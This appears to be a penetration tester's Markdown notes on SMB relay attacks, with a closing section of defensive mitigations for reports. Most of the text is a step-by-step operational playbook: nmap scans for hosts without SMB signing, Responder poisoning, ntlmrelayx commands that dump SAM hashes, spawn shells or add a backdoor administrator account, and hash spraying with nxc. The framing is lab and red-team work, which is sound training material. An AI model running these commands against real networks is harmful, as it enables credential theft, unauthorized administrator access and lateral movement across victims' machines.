# SMB Relay Attack

> These are internal network attacks that require the attacker to already be on the same network segment. Common in lab environments, assumed-breach scenarios, and red team engagements where physical or VPN access is established.

---

## What It Is

Instead of cracking NTLMv2 hashes captured by Responder, relay them directly to a target machine to gain access — **no cracking required**.

The flow:
1. Responder poisons LLMNR → Windows sends NTLMv2 hash to you
2. ntlmrelayx immediately forwards ("relays") that authentication to a different target machine
3. The target thinks it's receiving a legitimate auth request → grants access

**Why this is powerful:** Even if you cannot crack the hash (strong password), you can still authenticate AS that user on another machine.

---

## Requirements — All Three Must Be True

| Requirement | Details |
|---|---|
| Attacker on same network segment | SMB relay only works locally — cannot relay across routers |
| SMB signing disabled/not enforced on target | DCs always enforce signing — workstations usually do not |
| Relayed user is local admin on target | If they are not admin, you get an auth but cannot do anything useful |

**SMB signing note:** Domain Controllers have signing **required** by default — you cannot relay to a DC. Workstations have signing **enabled but not required** by default — these are your targets.

---

## Attack Steps

### Step 1 — Find Targets Without SMB Signing Required

```sh
nmap --script=smb2-security-mode.nse -p445 <ip/cidr>
```

Output to look for:
```
| smb2-security-mode:
|   2.0.2:
|_    Message signing enabled but not required    ← VULNERABLE
```

vs:
```
|_    Message signing enabled and required         ← NOT vulnerable (DC)
```

Save vulnerable IPs to a file:
```sh
nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24 -oG - | grep "not required" | awk '{print $2}' > targets.txt
```

### Step 2 — Configure Responder to NOT Handle SMB/HTTP

You are using Responder to capture the initial request, but ntlmrelayx needs to receive it — so disable Responder's own SMB and HTTP servers:

```sh
sudo nano /etc/responder/Responder.conf
# Change:
# SMB = Off
# HTTP = Off

sudo responder -I eth0 -dPv
```

### Step 3 — Start ntlmrelayx (second terminal)

```sh
# Dump SAM hashes from target (most common — gets local hashes)
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Get an interactive SMB shell on the target
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Execute a specific command on the target
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "net user hacker Password123! /add && net localgroup administrators hacker /add"
```

| Flag | What it does |
|---|---|
| `-tf targets.txt` | File with IPs to relay to — only targets without signing |
| `-smb2support` | Enable SMBv2 support (needed for modern Windows) |
| `-i` | Interactive shell mode — connect to it via nc after relay |
| `-c "cmd"` | Execute command on target as the relayed user |
| `-e file.exe` | Upload and execute a file |

### Step 4 — Wait for an Event

When a user on the network makes an LLMNR request:
- Responder captures it
- ntlmrelayx receives and relays it to your targets.txt machines
- If that user is local admin on any target → SAM dumped (or shell given)

Example ntlmrelayx output:
```
[*] Authenticating against smb://192.168.1.50 as CORP\jsmith SUCCEED
[*] SMBD-Thread-2: Connection from CORP/JSMITH@10.10.10.20 controlled, attacking target smb://192.168.1.50
[*] Dumping local SAM database (SMB)
Administrator:500:aad3...:31d6...:::
Guest:501:aad3...:31d6...:::
jsmith:1001:aad3...:f9cde...:::
```

### Step 5 — Use the Dumped Hashes

```sh
# Spray the hash across the network
nxc smb <cidr> -u Administrator -H <NT-hash> --local-auth

# If interactive shell mode (-i), connect to it
nc 127.0.0.1 11000
```

---

## Relaying Without Responder (Non-Spoofing Method)

If you can trigger an outbound NTLM authentication from a target through a legitimate attack vector (LNK file, web app SSRF to SMB, MSSQL `xp_dirtree` UNC path), you can relay that auth without any spoofing:

```sh
# Step 1 — scan for targets without SMB signing
nxc smb <cidr> --gen-relay-list targets.txt

# Step 2 — start ntlmrelayx waiting for inbound auth
sudo ntlmrelayx.py -tf targets.txt -smb2support
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Step 3 — trigger outbound NTLM auth from target via:
# - LNK file pointing to your IP  (see lnk-file-attack.md)
# - MSSQL xp_dirtree  (see tools/mssql.md)
# - Any app that makes outbound SMB connections
```

---

## Defense (For Report Writing)

**Option 1 — Enable SMB Signing on All Devices (Best)**
GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
- `Microsoft network client: Digitally sign communications (always)` → Enabled
- `Microsoft network server: Digitally sign communications (always)` → Enabled

This alone prevents SMB relay entirely — even if hashes are captured, they cannot be relayed.

**Option 2 — Disable NTLM Authentication**
Registry or GPO to force Kerberos-only. Aggressive — may break legacy applications.
GPO path: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → `Network security: LAN Manager authentication level` → "Send NTLMv2 response only. Refuse LM & NTLM"

**Option 3 — Account Tiering**
Ensure Domain Admins never authenticate to workstations. Even if a workstation is compromised, the relayed hash will not be a DA. Tiering = separate accounts for admin tasks vs daily work.

**Option 4 — LAPS (Local Administrator Password Solution)**
Randomize local admin passwords per machine. Even if one machine is compromised via relay, the local admin hash does not work on any other machine.

**Why this matters for the report:**
SMB relay can give you code execution on multiple machines with zero cracking required. Combined with account tiering weaknesses (DA using their DA account on a workstation), this is a path to full domain compromise in one step.
